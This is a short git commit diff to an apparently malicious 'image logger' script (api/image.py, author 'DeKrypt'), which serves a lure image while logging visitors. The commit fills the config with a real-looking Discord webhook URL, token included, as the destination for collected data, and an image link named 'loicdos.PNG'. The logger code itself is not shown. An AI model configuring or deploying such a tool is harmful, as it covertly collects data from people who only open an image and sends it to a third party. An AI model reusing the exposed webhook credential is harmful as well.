c358292a0177f2950d6390848a2e472daec07f01
SchoolLearn <153337825+SchoolLearn@users.noreply.github.com>
2025-02-11 21:17:25 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1339056814884393020/4TLBQUsfuxJUkQmFtLXuU2KB3FrFi8yYJpx8z5KZVKvxnjIcf9bR-FzWmqRIbBeKMVzK",
+    "image": "https://hackblue.org/images/loicdos.PNG", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
